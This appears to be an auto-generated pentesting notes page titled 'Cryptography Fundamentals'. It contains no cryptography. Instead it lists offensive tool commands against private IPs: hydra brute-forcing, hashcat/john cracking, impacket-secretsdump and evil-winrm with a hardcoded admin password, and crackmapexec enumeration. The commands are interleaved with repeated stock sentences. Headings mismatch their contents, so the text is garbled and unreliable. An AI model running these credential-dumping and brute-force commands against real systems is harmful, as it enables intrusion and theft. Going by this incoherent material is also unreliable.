---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, privilege escalation, networking, dfir"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-209.html"
URL_IMAGES: ""
Date: "2024-07-06"
Tags: "Persistence, Privilege Escalation, Networking, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-209"
Permalink: "/notes/note-cryptography-fundamentals-209.html"
BtnLabel: "Read Notes"
Pick: 0
---
## msfvenom

### Kerberoasting

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.186.27 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. The database credentials were hardcoded in the application source code.

## Telnet

### HTTP

```powershell
nmap -sCV -p3306,445,443 10.117.17.34 -oN scan.txt
```

- `Remote File Inclusion`
- `lookupsid`
- `CORS Misconfiguration`
- `nikto`
- `SQL Injection`

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services.

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

## crackmapexec

### Debian

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

```python
evil-winrm -i 10.23.16.47 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

## Subdomain Takeover

### C#

```bash
gobuster dir -u http://10.66.248.99/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.55.192.107
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.21.154.77/FUZZ
gobuster dir -u http://10.123.132.111/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.97.83.196/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.188.97 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.70.121.129/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## ligolo-ng

### DLL Hijacking

```bash
crackmapexec smb 10.42.110.221 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p139,143,389 10.42.50.249 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.51.29
```

```powershell
crackmapexec smb 10.120.47.45 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.14.175.193 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Sudo Misconfiguration

### Weak Service Permissions

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file.

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target.
